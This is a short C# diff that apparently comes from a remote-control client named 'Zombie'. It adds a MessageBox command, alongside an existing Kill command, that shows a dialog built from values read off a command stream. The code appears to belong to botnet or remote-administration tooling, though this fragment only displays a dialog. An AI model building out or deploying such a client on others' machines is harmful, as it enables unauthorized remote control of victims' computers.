@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 using Zombie.Web;
 
 namespace Zombie.Functions
@@ -37,6 +38,9 @@ namespace Zombie.Functions
                     break;
                 case CommandFlags.Kill:
                     Kill.Request();
+                    break;
+                case CommandFlags.MessageBox:
+                    Dialog.Show(reader.ReadString(), reader.ReadString(), (MessageBoxButtons)reader.ReadInt32(), (MessageBoxIcon)reader.ReadInt32());
                     break;
 
             }
